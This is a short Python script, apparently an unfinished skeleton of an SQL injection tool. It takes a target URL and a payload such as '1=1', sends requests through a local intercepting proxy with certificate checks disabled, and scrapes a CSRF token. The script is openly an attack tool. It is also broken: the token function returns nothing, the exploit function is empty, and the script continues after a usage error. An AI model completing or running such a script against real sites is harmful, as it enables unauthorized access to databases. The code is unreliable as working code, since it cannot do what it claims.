import requests
import sys
import urllib3
from bs4 import BeautifulSoup

proxies = {'http': 'http://127.0.0.1:8080','https':"http://127.0.0.1"}

def get_csrf_token(s,url):
    r = s.get(url, verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find("input")['value']
    print(csrf)

def exploit_sqli(s,url,payload):
    csrf = get_csrf_token(s,url)
    
    

if __name__ == '__main__':
    
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.xxx.com "1=1"' % sys.argv[0])
    
    s = requests.Session()

    if exploit_sqli(s,url,sqli_payload):
        print('[-] success')
    else:
        print('[-] Sql injection unsucessful.')



